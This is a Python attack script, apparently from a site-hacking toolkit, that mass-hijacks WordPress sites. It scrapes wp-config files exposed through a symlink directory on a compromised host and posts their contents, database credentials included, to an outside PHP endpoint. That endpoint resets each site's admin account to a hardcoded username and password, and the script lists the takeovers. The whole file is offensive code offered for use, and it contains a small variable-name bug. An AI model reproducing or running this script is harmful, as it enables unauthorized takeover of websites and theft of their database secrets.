#!/usr/bin/python

"""
Wordpress Mass Change User - PHP 7 Only
"""

import re
import sys
import requests
import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

mati = 12

user = "admin403" # Change If You Want
pwd = "JancoxSc0de"
head = {"User-agent":"Linux Mozilla 5/0"}
urlsym1 = raw_input("urlsym > ")
urlsym = urlsym+"/"
api = raw_input("urlapi > ")
text1 = requests.get(urlsym, headers=head).text
list = re.findall('</td><td><a href="(.*?)">', text1)
for i in list:
	if "-Wordpress" in i:
		print("["+i+"]"),
		conf = requests.get(urlsym+i).text
		data = {"user_baru":user,"pass_baru":pwd,"config":conf,"hajar":"hajar"}
		text = requests.post("http://purespirit.com.ar/wp-content/upgrade/api.php", data=data, headers=head, verify=False, timeout=mati).text
		if "color=lime>sukses" in text:
			print("[USER CHANGED]"),
			ua = "./Xi4u7 Tools 8/0"
			trgt = re.findall("Login => <a href='(.*?)/wp-login.php' target='_blank'>", text)
			print("["+trgt[0]+"]"),
			print("[USER: "+user+"][PASS: "+pwd+"]")
		else:
			print("[USER NOT CHANGED]")
